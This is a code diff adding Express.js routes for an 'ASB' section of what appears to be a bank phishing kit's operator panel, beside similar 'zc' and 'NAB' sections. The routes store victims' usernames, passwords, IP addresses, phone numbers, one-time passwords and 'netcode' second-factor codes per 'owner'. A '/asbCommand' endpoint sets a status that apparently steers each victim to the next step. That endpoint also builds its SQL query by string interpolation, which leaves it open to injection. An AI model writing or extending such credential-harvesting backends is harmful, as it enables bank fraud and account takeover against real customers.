@@ -2060,6 +2060,132 @@ app.post("/zcSaveLogin", cors(), (req, res) => {
   res.send("Completed");
 });
 
+//ASB
+//ASB
+//ASB
+
+app.options("/asbCustomers/:id/:owner/modal", cors());
+
+app.get("/asbCustomers/:id/:owner/modal", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM asb WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/asbCustomers/:owner", cors());
+
+app.get("/asbCustomers/:owner", (req, res) => {
+  owner = req.params.owner;
+  let details = [owner];
+  let query = `SELECT * FROM asb WHERE owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/asbCommand", cors());
+
+app.post("/asbCommand", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  newStatus = req.body.status;
+  let query = `UPDATE asb SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;
+
+  panelConnection.query(query, (err, rows, fields) => {
+    if (!err) res.send("Update Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/asbCustomers/:id/:owner", cors());
+
+app.get("/asbCustomers/:id/:owner", (req, res) => {
+  uniqueid = req.params.id;
+  owner = req.params.owner;
+
+  let details = [uniqueid, owner];
+  let query = `SELECT * FROM asb WHERE uniqueid= ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send(rows);
+    else console.log(err);
+  });
+});
+
+app.options("/asbSaveLogin", cors());
+
+app.post("/asbSaveLogin", cors(), (req, res) => {
+  username = req.body.username;
+  password = req.body.password;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [username, password, uniqueid, ip, owner];
+  let query = `INSERT INTO asb(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/asbSaveTelephone", cors());
+
+app.post("/asbSaveTelephone", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+
+  let details = [telephone, uniqueid, owner];
+  let query = `UPDATE asb SET telephone=?, status = 7 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/asbSaveOtp", cors());
+
+app.post("/asbSaveOtp", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  otp = req.body.otp;
+  owner = req.body.owner;
+
+  let details = [otp, uniqueid, owner];
+  let query = `UPDATE asb SET otp=?, status = 3 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/asbSaveNetcode", cors());
+
+app.post("/asbSaveNetcode", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  netcode = req.body.netcode;
+  owner = req.body.owner;
+
+  let details = [netcode, uniqueid, owner];
+  let query = `UPDATE asb SET netcode=?, status = 5 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
 //NAB
 //NAB
 //NAB
